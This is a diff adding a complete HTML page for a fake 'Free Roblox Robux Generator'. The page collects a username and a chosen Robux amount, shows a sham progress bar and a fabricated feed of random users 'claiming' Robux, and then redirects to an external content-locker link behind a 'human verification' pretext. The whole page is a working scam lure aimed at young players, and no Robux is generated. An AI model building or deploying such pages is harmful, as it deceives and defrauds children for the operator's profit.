@@ -1,0 +1,183 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Roblox Robux Generator</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background: url('background.png') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+    .container {
+      max-width: 500px;
+      margin: auto;
+      background: rgba(0, 0, 0, 0.6);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.7);
+    }
+    .logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+    input[type="text"] {
+      padding: 12px;
+      width: 80%;
+      margin: 15px 0;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+    .robux-select {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin: 20px 0;
+    }
+    .robux-btn {
+      background-color: #ffd700;
+      color: black;
+      padding: 12px 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .generate-btn {
+      background-color: #00ffcc;
+      color: black;
+      font-size: 20px;
+      padding: 15px 40px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .progress-container {
+      margin-top: 20px;
+      display: none;
+    }
+    .progress-bar {
+      width: 100%;
+      background-color: #555;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+    .progress-fill {
+      height: 20px;
+      width: 0;
+      background-color: lime;
+      text-align: center;
+      line-height: 20px;
+      color: black;
+      font-weight: bold;
+    }
+    .feed {
+      margin-top: 30px;
+      font-size: 14px;
+      background: rgba(255,255,255,0.1);
+      padding: 10px;
+      border-radius: 10px;
+      height: 100px;
+      overflow: hidden;
+    }
+    .note {
+      font-size: 14px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="logo.png" alt="Roblox Logo" class="logo" />
+    <h1>🎁 Free Roblox Robux Generator</h1>
+    <p>Type in your Roblox username to continue</p>
+    <input type="text" id="username" placeholder="Enter your Roblox username" />
+
+    <p>Select how many Robux you want:</p>
+    <div class="robux-select">
+      <button class="robux-btn" onclick="selectAmount(400)">400 Robux</button>
+      <button class="robux-btn" onclick="selectAmount(800)">800 Robux</button>
+      <button class="robux-btn" onclick="selectAmount(1700)">1700 Robux</button>
+      <button class="robux-btn" onclick="selectAmount(4500)">4500 Robux</button>
+    </div>
+
+    <button class="generate-btn" onclick="generate()">Generate Robux</button>
+
+    <div class="progress-container" id="progressContainer">
+      <p>🔒 Unlocking Robux for <span id="userDisplay"></span>...</p>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill">0%</div>
+      </div>
+    </div>
+
+    <p class="note">* Free Robux is limited. Human verification required.</p>
+
+    <div class="feed" id="activityFeed">
+      <p>Player123 just claimed 800 Robux</p>
+      <p>Robloxian99 just claimed 400 Robux</p>
+      <p>NoobMaster69 just claimed 1700 Robux</p>
+    </div>
+
+    <audio id="successSound" src="https://www.myinstants.com/media/sounds/success-fanfare-trumpets.mp3"></audio>
+  </div>
+
+  <script>
+    let selectedAmount = null;
+    const usernames = ["GamerPro12", "XxRobloxGodxX", "BlockyQueen", "NoobMaster69", "EpicBloxer", "Player123"];
+    const feed = document.getElementById('activityFeed');
+
+    function selectAmount(amount) {
+      selectedAmount = amount;
+      document.querySelectorAll('.robux-btn').forEach(btn => btn.style.backgroundColor = '#ffd700');
+      event.target.style.backgroundColor = '#ffa500';
+    }
+
+    function generate() {
+      const username = document.getElementById('username').value.trim();
+      if (!username) return alert("Please enter your Roblox username.");
+      if (!selectedAmount) return alert("Please select how many Robux you want.");
+
+      document.getElementById("userDisplay").textContent = username;
+      document.getElementById("progressContainer").style.display = "block";
+
+      if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+
+      let width = 0;
+      const progress = document.getElementById("progressFill");
+      const sound = document.getElementById("successSound");
+      const interval = setInterval(() => {
+        if (width >= 100) {
+          clearInterval(interval);
+          sound.play();
+          setTimeout(() => {
+            window.location.href = "https://locked3.com/cl/i/wovxdm";
+          }, 1500);
+        } else {
+          width += 2;
+          progress.style.width = width + "%";
+          progress.textContent = width + "%";
+        }
+      }, 100);
+    }
+
+    setInterval(() => {
+      const name = usernames[Math.floor(Math.random() * usernames.length)];
+      const robux = [400, 800, 1700, 4500][Math.floor(Math.random() * 4)];
+      const msg = `${name} just claimed ${robux} Robux`;
+      const newP = document.createElement("p");
+      newP.textContent = msg;
+      if (feed.children.length >= 5) feed.removeChild(feed.firstChild);
+      feed.appendChild(newP);
+    }, 3000);
+  </script>
+</body>
+</html>
